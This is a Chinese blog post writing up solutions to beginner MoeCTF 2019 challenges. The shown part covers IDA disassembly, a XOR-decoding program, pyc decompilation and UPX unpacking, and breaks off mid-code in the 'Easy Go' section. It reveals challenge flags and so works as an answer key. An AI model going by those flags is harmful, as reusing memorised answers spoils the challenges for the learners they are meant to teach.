<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>MoeCTF 2019 题解 - Reverier&#39;s Blog</title><meta name="Description" content="Creating reality with idealism."><meta property="og:title" content="MoeCTF 2019 题解" />
<meta property="og:description" content="前言
好了,本蒟蒻要开始写题解了…
比赛结束力!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.woooo.tech/posts/moectf_2019_wp/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-09-06T18:23:00+08:00" />
<meta property="article:modified_time" content="2019-09-06T18:23:00+08:00" /><meta property="og:site_name" content="Reverier&#39;s Blog" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="MoeCTF 2019 题解"/>
<meta name="twitter:description" content="前言
好了,本蒟蒻要开始写题解了…
比赛结束力!"/>
<meta name="application-name" content="Reverier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Reverier&#39;s Blog"><meta name="theme-color" content="#0078D6"><meta name="msapplication-TileColor" content="#0078D6"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#0078D6"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.woooo.tech/posts/moectf_2019_wp/" /><link rel="prev" href="https://blog.woooo.tech/posts/moectf_2019_inspirement/" /><link rel="next" href="https://blog.woooo.tech/posts/for_shit_http_headers/" /><link rel="stylesheet" href="/css/style.min.519b64cb5eb54579779c509062777056449484da1d13d762f5152138c8c4422c.css" integrity="sha256-UZtky161RXl3nFCQYndwVkSUhNodE9di9RUhOMjEQiw="><link rel="preload" href="/lib/fontawesome-free/all.min.0df5a33710e433de1f5415b1d47e4130ca7466aee5b81955f1045c4844bbb3ed.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.0df5a33710e433de1f5415b1d47e4130ca7466aee5b81955f1045c4844bbb3ed.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0="></noscript><link rel="preload" href="/lib/animate/animate.min.5fbaeb9f8e25d7e0143bae61d4b1802c16ce7390b96ceb2d498b0d96ff4c853f.css" integrity="sha256-X7rrn44l1+AUO65h1LGALBbOc5C5bOstSYsNlv9MhT8=" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.5fbaeb9f8e25d7e0143bae61d4b1802c16ce7390b96ceb2d498b0d96ff4c853f.css" integrity="sha256-X7rrn44l1+AUO65h1LGALBbOc5C5bOstSYsNlv9MhT8="></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "MoeCTF 2019 题解",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.woooo.tech\/posts\/moectf_2019_wp\/"
        },"genre": "posts","keywords": "CTF","wordcount":  15455 ,
        "url": "https:\/\/blog.woooo.tech\/posts\/moectf_2019_wp\/","datePublished": "2019-09-06T18:23:00+08:00","dateModified": "2019-09-06T18:23:00+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Reverier-Xu"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Reverier&#39;s Blog"><span class="header-title-pre"><span style="color: #0078D6;">#  </span></span><span id="id-1" class="typeit"></span></a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"><span style="color: #0078D6">&gt;&gt;</span> 文章 </a><a class="menu-item" href="/tags/"><span style="color: #0078D6">&gt;&gt;</span> 标签 </a><a class="menu-item" href="/categories/"><span style="color: #0078D6">&gt;&gt;</span> 分类 </a><a class="menu-item" href="/friends"><span style="color: #0078D6">&gt;&gt;</span> 朋友们 </a><a class="menu-item" href="/about"><span style="color: #0078D6">&gt;&gt;</span> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Reverier&#39;s Blog"><span class="header-title-pre"><span style="color: #0078D6;">#  </span></span><span id="id-2" class="typeit"></span></a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/posts/" title=""><span style="color: #0078D6">&gt;&gt;</span>文章</a><a class="menu-item" href="/tags/" title=""><span style="color: #0078D6">&gt;&gt;</span>标签</a><a class="menu-item" href="/categories/" title=""><span style="color: #0078D6">&gt;&gt;</span>分类</a><a class="menu-item" href="/friends" title=""><span style="color: #0078D6">&gt;&gt;</span>朋友们</a><a class="menu-item" href="/about" title=""><span style="color: #0078D6">&gt;&gt;</span>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">MoeCTF 2019 题解</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://blog.woooo.tech" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Reverier-Xu</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2019-09-06">2019-09-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;15455 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;31 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#sign-in">Sign In</a>
      <ul>
        <li><a href="#你是西电新生吗">你是西电新生吗?</a></li>
      </ul>
    </li>
    <li><a href="#reverse">Reverse</a>
      <ul>
        <li><a href="#introducing-re">Introducing RE</a></li>
        <li><a href="#moe-re">Moe RE</a></li>
        <li><a href="#pyc">.pyc</a></li>
        <li><a href="#easy-shell">Easy Shell</a></li>
        <li><a href="#easy-debugger">Easy Debugger</a></li>
        <li><a href="#easy-go">Easy Go</a></li>
        <li><a href="#java-re">Java RE</a></li>
        <li><a href="#mine-sweep">Mine Sweep</a></li>
        <li><a href="#easy-re">Easy RE</a></li>
        <li><a href="#algorithm-task">Algorithm Task</a></li>
        <li><a href="#easy-c">Easy C++</a></li>
      </ul>
    </li>
    <li><a href="#programming">Programming</a>
      <ul>
        <li><a href="#easy-ppc">Easy PPC</a></li>
        <li><a href="#w1nd牛逼">w1nd牛逼！</a></li>
        <li><a href="#a-template-problem">A Template Problem</a></li>
        <li><a href="#perfect-repeater">Perfect Repeater</a></li>
        <li><a href="#frank-nb">Frank NB!</a></li>
        <li><a href="#random-encode">Random Encode</a></li>
        <li><a href="#tree-distance">Tree Distance</a></li>
        <li><a href="#f1gs-diamond">F1@g‘s diamond</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#pigpen-cipher">Pigpen Cipher</a></li>
        <li><a href="#rail-fence-cipher">Rail fence cipher</a></li>
        <li><a href="#bacons-cipher">Bacon’s Cipher</a></li>
        <li><a href="#frequency-analysis">Frequency analysis?</a></li>
        <li><a href="#md5">MD5</a></li>
        <li><a href="#columnar-transposition">Columnar Transposition</a></li>
        <li><a href="#columnar-transposition-1">Columnar transposition</a></li>
        <li><a href="#easy-rsa">Easy RSA</a></li>
        <li><a href="#hill-cipher">Hill Cipher</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#get">GET</a></li>
        <li><a href="#post">POST</a></li>
        <li><a href="#introducing-web">Introducing Web</a></li>
        <li><a href="#easy-limitation">Easy Limitation</a></li>
        <li><a href="#procotol">Procotol</a></li>
        <li><a href="#restrictions">Restrictions</a></li>
        <li><a href="#是时候展示十八年单身的手速了">是时候展示十八年单身的手速了</a></li>
        <li><a href="#英国人">英国人</a></li>
        <li><a href="#amazing_eval">Amazing_Eval</a></li>
        <li><a href="#今天你备份了嘛">今天你备份了嘛</a></li>
        <li><a href="#php-弱类型">PHP 弱类型</a></li>
        <li><a href="#php_md5">PHP_md5()</a></li>
        <li><a href="#神奇的正则表达式">神奇的正则表达式</a></li>
        <li><a href="#头">头</a></li>
        <li><a href="#stronger_php">stronger_php</a></li>
        <li><a href="#终极http请求头">终极HTTP请求头</a></li>
        <li><a href="#朝鲜人">朝鲜人</a></li>
        <li><a href="#1什么是edns"><em>1、什么是EDNS？</em></a></li>
        <li><a href="#2为什么要有-edns">2、为什么要有 EDNS？</a></li>
        <li><a href="#3edns-的内容是什么"><em>3、EDNS 的内容是什么？</em></a></li>
        <li><a href="#dynamic">Dynamic</a></li>
      </ul>
    </li>
    <li><a href="#android">Android</a>
      <ul>
        <li><a href="#android_signin">Android_Signin</a></li>
        <li><a href="#clickit">ClickIt</a></li>
      </ul>
    </li>
    <li><a href="#devops">DevOps</a>
      <ul>
        <li><a href="#sni">SNI</a></li>
        <li><a href="#sni-1">SNI++</a></li>
      </ul>
    </li>
    <li><a href="#misc">MISC</a>
      <ul>
        <li><a href="#世界辣么大">世界辣么大</a></li>
        <li><a href="#easy-base64">Easy base64</a></li>
        <li><a href="#网线大鲨鱼">网线大鲨鱼</a></li>
        <li><a href="#你的脑洞够大吗">你的脑洞够大吗</a></li>
        <li><a href="#被伪加密的文档">被伪加密的文档</a></li>
        <li><a href="#修复分离">修复&amp;分离</a></li>
        <li><a href="#keyboard">Keyboard</a></li>
        <li><a href="#恼人的aliga">恼人的Aliga</a></li>
        <li><a href="#secret-code">Secret Code</a></li>
        <li><a href="#base64">Base64?</a></li>
        <li><a href="#aiaiai">AiAiAi</a></li>
        <li><a href="#osu-master">Osu Master</a></li>
        <li><a href="#sd的嘲讽表情">s@d的嘲讽表情</a></li>
        <li><a href="#kokoro">Kokoro</a></li>
        <li><a href="#show-off">Show Off</a></li>
      </ul>
    </li>
    <li><a href="#pwn">PWN</a>
      <ul>
        <li><a href="#欢迎来到pwn的世界">欢迎来到pwn的世界</a></li>
        <li><a href="#pwn1">pwn1</a></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="前言">前言</h1>
<p>好了,本蒟蒻要开始写题解了…</p>
<p>比赛结束力!</p>
<h1 id="题解">题解</h1>
<h2 id="sign-in">Sign In</h2>
<h3 id="你是西电新生吗">你是西电新生吗?</h3>
<p>签到题, 加入考试群, 在公告里面就可以发现<code>flag</code>, 复制, 提交, 一百分到手~</p>
<h2 id="reverse">Reverse</h2>
<h3 id="introducing-re">Introducing RE</h3>
<p>这道题&hellip; 就是教你怎么用<code>IDA</code>的..</p>
<p>在网上找来的<code>IDA</code>资源, ,然后安装,打开,发现了这么几句:</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov     dword ptr [esp], offset aWelcomeToTheMo ; &#34;Welcome to the MoeCTF!&#34;
call    puts
mov     dword ptr [esp+17h], 63656F6Dh
mov     dword ptr [esp+1Bh], 447B6674h
mov     dword ptr [esp+1Fh], 6F595F30h
mov     dword ptr [esp+23h], 326B5F75h
mov     dword ptr [esp+27h], 495F776Fh
mov     dword ptr [esp+2Bh], 7D3F4144h
mov     byte ptr [esp+2Fh], 0
lea     eax, [esp+30h+var_19]
mov     [esp], eax      ; char *
call    sub_401500
</code></pre><p>然后找了个16进制转ASCII的网站, 复制第三行的 <code>63 65 6F 6D</code> 进去, 发现解出来是 <code>ceom</code></p>
<p>啊嘞?反过来不就是 <code>moec</code> 么?</p>
<p>按照这个思路, 挨个复制然后反过来输出, 就把 <code>flag</code> 找到了.</p>
<h3 id="moe-re">Moe RE</h3>
<p>这道题我本来是第二题做的,, 后来发现竟然比我想象中的难&hellip;</p>
<p>下载了<code>re</code>, 发现打不开, 就扔进<code>Windows</code>的<code>Linux</code>子系统里, 发现依旧打不开, 啊嘞? 什么情况? 不行我重启到<code>Arch Linux</code>试试? 算了我懒得费那个神&hellip; 直接扔进IDA, 发现汇编读不懂, 就按了下F5, 得到了以下伪代码:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>                   <span class="c1">// 注释是后来自己添加的
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-A0h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-9Ch]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-98h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-90h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v9</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+40h] [rbp-70h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+A8h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">v9</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>   <span class="c1">// 获取输入 v9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v3</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">v9</span><span class="p">);</span>         <span class="c1">// 获取输入长度
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v7</span> <span class="o">=</span> <span class="n">v3</span><span class="p">;</span>                 <span class="c1">// 现在v3 == v7,都是长度
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="s">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">);</span> <span class="c1">// v8 好像是个 table
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">v3</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//遍历输入, 然后把v9里每个字符和table的第i个字符进行异或运算...
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">v9</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v8</span> <span class="o">+</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">26</span><span class="p">);</span> <span class="c1">//*((_BYTE ... % 26)这句就相当于v8[i % 26]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">v7</span><span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span> <span class="c1">//输出v9里各个字符的数字
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d,&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">v9</span><span class="p">[</span><span class="n">j</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">__stack_chk_guard</span> <span class="o">==</span> <span class="n">v10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>小小的研究一下源代码, 发现是个简单的算法, 具体如代码注释里写的那样, 于是写一个小程序破解之:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;cstdio&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">v</span><span class="p">[</span><span class="mi">27</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">scanf</span><span class="p">(</span><span class="s">&#34;%d,&#34;</span><span class="p">,</span> <span class="n">x</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">result</span> <span class="o">=</span> <span class="kt">int</span><span class="p">(</span><span class="n">v</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">26</span><span class="p">])</span> <span class="o">^</span> <span class="n">x</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">result</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>差不多就是把题目反着写了一遍, 然后运行, 把题目给的数字串输入进去,回车出<code>flag</code>.</p>
<h3 id="pyc">.pyc</h3>
<p>啊嘞? <code>Python</code>难道不是解释型语言么??? ( 我见识太少了 [ 抱头痛哭 ]</p>
<p>按照Bing上搜到的说法, 我就先装了个反编译<code>tool</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ pip install uncompyle
</span></span></code></pre></div><p>然后&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ uncompyle6 ./test.cpython-37.pyc &gt; ./test.cpython-37.py
</span></span></code></pre></div><p>再然后就得到了以下代码, 官方说<code>uncompyle</code>只支持<code>Python2.x</code>, 所以搞出来的有bug, 不过差不多能理解:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># uncompyle6 version 3.4.0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Python bytecode 3.7 (3394)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Embedded file name: test.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Size of source mod 2**32: 294 bytes</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">b2a_hex</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b32encode</span>
</span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="nb">input</span>
</span></span><span class="line"><span class="cl"><span class="n">y</span> <span class="o">=</span> <span class="nb">print</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">b2a_hex</span><span class="p">(</span><span class="n">b32encode</span><span class="p">(</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;4e5658574b5933554d5a3558413452544d4d59473234444a4e525557345a5a4e4b4234574758334447525846364d44514f51595732324c324d55575647344254474e5348323d3d3d&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">y</span><span class="p">(</span><span class="s1">&#39;congrats&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># okay decompiling C:\\users\rever\Downloads\test.cpython-37.pyc</span>
</span></span></code></pre></div><p>看见了一大串hex, 于是找了个网站转换之:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">NVXWKY3UMZ5XA4RTMMYG24DJNRUW4ZZNKB4WGX3DGRXF6MDQOQYW22L2MUWVG4BTGNSH2</span><span class="o">===</span>
</span></span></code></pre></div><p>根据源代码, 这是一份<code>base32</code>加密的玩意儿, 于是再找个网站解密得到<code>flag</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">moectf<span class="o">{</span>pr3c0mpiling-Pyc_c4n_0pt1mize-Sp33d<span class="o">}</span>
</span></span></code></pre></div><h3 id="easy-shell">Easy Shell</h3>
<p>这个我说什么好咧.. 就是百度找了个<code>upx tool</code>,然后把题上给的<code>exe</code>扔了进去, 再把吐出来的东西扔进<code>IDA</code>&hellip; 发现这么一段:</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov     dword ptr [esp], offset aWelcomeToTheMo ; &#34;Welcome to the MoeCTF!&#34;
call    puts
mov     dword ptr [esp+11h], 63656F6Dh
mov     dword ptr [esp+15h], 757B6674h
mov     dword ptr [esp+19h], 315F7870h
mov     dword ptr [esp+1Dh], 5F615F73h
mov     dword ptr [esp+21h], 646E314Bh
mov     dword ptr [esp+25h], 5F46305Fh
mov     dword ptr [esp+29h], 31326873h
mov     word ptr [esp+2Dh], 7D4Ch
mov     byte ptr [esp+2Fh], 0
lea     eax, [esp+30h+var_1F]
</code></pre><p>看到那个<code>63 65 6F 6D</code>我就明白了, 和<code>IntroducingRE</code>相同解法, 得到<code>flag</code>.</p>
<h3 id="easy-debugger">Easy Debugger</h3>
<p>这题是告诉你怎么用调试器的&hellip; 我懒, 就扔进<code>Visual Studio</code>开了个调试, 然后<code>flag</code>就自己蹦出来了&hellip; 没什么技术含量, 对吧&hellip;</p>
<h3 id="easy-go">Easy Go</h3>
<p>从这题开始, 我知道了, 所有写着Easy的题, 都是骗人的🙂一点都不Easy&hellip; 可能我菜是很大的原因吧……</p>
<p>还是相同的套路, 下载后扔进<code>IDA</code>, 然后看见了浩如烟海的函数&hellip; ( woc要不要这么刺激</p>
<p>费尽千辛万苦找到了main_main函数, 打开后看了眼汇编发现头疼, 果断F5:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main_main</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a2</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                             <span class="kr">__int64</span> <span class="n">a3</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a4</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a5</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">a6</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* 一大堆变量声明,节省篇幅就不看了 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/* 对解题没什么用的函数 */</span>
</span></span><span class="line"><span class="cl">  <span class="n">fmt_Fscanln</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v23</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_4AAF60</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="n">v8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">go_itab__os_File_io_Reader</span><span class="p">,</span> <span class="n">os_Stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v19</span> <span class="o">==</span> <span class="mi">1107LL</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">runtime_convTstring</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">v9</span><span class="p">);</span>
